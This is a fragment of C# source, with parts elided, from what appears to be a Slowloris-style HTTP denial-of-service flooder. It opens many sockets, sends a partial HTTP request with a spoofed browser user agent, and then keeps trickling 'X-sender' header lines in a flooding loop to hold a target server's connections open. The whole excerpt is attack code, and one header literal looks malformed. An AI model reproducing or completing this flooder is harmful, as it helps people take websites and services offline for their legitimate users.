            ...
            try {
                ...
                var sbuf =
                    System.Text.Encoding.ASCII.GetBytes(
                        String.Format(
                            "{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}",
                            this._subSite,
                            Environment.NewLine,
                            this._dns,
                            ( ( this._useget ) ? "GET" : "POST" ),
                            ( ( this._usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ) ) );
                var tbuf = System.Text.Encoding.ASCII.GetBytes( @"X-sender: b{\_rng\n" );
                ...
                while ( this.IsFlooding ) {
                    ...
                    if ( this._randcmds )
                        tbuf = System.Text.Encoding.ASCII.GetBytes( "X-sender: b" + Misc.RS() + "\r\n" );
                    ...
                    for (var i = ( this._lSockets[ myIndexForWork ].Count - 1 ); i >= 0; i--)
                        try {
                            ...
                            if ( !this._lSockets[ myIndexForWork ][ i ].Connected
                                 || ( this._lSockets[ myIndexForWork ][ i ].Send( tbuf ) <= 0 ) ) {
